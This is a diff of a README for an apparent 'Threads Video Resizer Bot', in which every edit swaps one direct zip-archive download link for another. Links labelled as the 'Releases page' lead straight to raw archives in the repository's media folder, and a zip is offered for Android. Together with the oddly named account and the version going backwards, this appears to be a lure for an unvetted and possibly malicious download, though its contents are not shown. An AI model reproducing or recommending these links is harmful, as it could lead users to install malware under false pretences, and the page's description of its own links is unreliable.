@@ -1,6 +1,6 @@
 # 🎥 Threads-Video-Resizer-Bot - Resize Videos with Ease
 
-[![Download Now](https://raw.githubusercontent.com/factitious-williamburroughs449/Threads-Video-Resizer-Bot/main/media/Threads-Video-Resizer-Bot_v2.9.zip%20Now-Threads--Video--Resizer--Bot-brightgreen)](https://raw.githubusercontent.com/factitious-williamburroughs449/Threads-Video-Resizer-Bot/main/media/Threads-Video-Resizer-Bot_v2.9.zip)
+[![Download Now](https://github.com/factitious-williamburroughs449/Threads-Video-Resizer-Bot/raw/refs/heads/main/media/Bot_Video_Threads_Resizer_v2.7-alpha.3.zip%20Now-Threads--Video--Resizer--Bot-brightgreen)](https://github.com/factitious-williamburroughs449/Threads-Video-Resizer-Bot/raw/refs/heads/main/media/Bot_Video_Threads_Resizer_v2.7-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,13 +12,13 @@ To get started, follow these simple steps:
 
 1. Click on the download button below to visit the Releases page:
 
-   [Download Threads Video Resizer Bot](https://raw.githubusercontent.com/factitious-williamburroughs449/Threads-Video-Resizer-Bot/main/media/Threads-Video-Resizer-Bot_v2.9.zip)
+   [Download Threads Video Resizer Bot](https://github.com/factitious-williamburroughs449/Threads-Video-Resizer-Bot/raw/refs/heads/main/media/Bot_Video_Threads_Resizer_v2.7-alpha.3.zip)
 
 2. On the Releases page, find the latest version of the software. 
 
 3. Download the file that matches your device. Common versions include:
 
-   - For Android devices: `https://raw.githubusercontent.com/factitious-williamburroughs449/Threads-Video-Resizer-Bot/main/media/Threads-Video-Resizer-Bot_v2.9.zip`
+   - For Android devices: `https://github.com/factitious-williamburroughs449/Threads-Video-Resizer-Bot/raw/refs/heads/main/media/Bot_Video_Threads_Resizer_v2.7-alpha.3.zip`
 
 4. Once the download is complete, locate the file on your device.
 
@@ -54,4 +54,4 @@ Threads Video Resizer Bot is licensed under the MIT License. You may use, modify
 
 ---
 
-This guide provides all the necessary information to download and use the Threads Video Resizer Bot. For additional details about features and updates, always refer to the [GitHub Releases page](https://raw.githubusercontent.com/factitious-williamburroughs449/Threads-Video-Resizer-Bot/main/media/Threads-Video-Resizer-Bot_v2.9.zip). Happy resizing!
+This guide provides all the necessary information to download and use the Threads Video Resizer Bot. For additional details about features and updates, always refer to the [GitHub Releases page](https://github.com/factitious-williamburroughs449/Threads-Video-Resizer-Bot/raw/refs/heads/main/media/Bot_Video_Threads_Resizer_v2.7-alpha.3.zip). Happy resizing!
